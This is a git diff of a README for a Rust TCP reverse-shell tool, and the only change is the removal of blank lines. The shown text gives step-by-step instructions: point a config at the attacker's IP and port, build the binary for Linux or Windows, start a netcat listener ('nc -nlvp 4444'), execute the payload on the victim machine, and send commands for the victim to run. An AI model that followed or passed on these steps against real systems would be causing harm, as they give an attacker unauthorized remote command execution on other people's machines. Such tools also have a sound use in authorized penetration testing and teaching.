@@ -9,7 +9,6 @@ Linux target               |  Windows target
 
 1. [Not shown in GIF] Open [the config file](https://github.com/kmanc/remote_code_oxidation/blob/master/tcp_reverse_shell/src/config.rs) 
 and change the IP address and port to match the IP address of your attacking machine and the port you will use for a listener respectively
-
 2. [Not shown in GIF] Compile the executable
 
     #### For Linux targets
@@ -21,14 +20,11 @@ and change the IP address and port to match the IP address of your attacking mac
     ```commandline
     cargo build --target x86_64-pc-windows-gnu -p tcp_reverse_shell --release
     ```
-
 3. Start a netcat listener on the attacking machine on the same port you configured in step 1
     ```commandline
     nc -nlvp 4444
     ```
-
 4. Execute the payload on the victim machine
-
 5. Return to the listener and enter desired commands for the victim machine to run
 
 
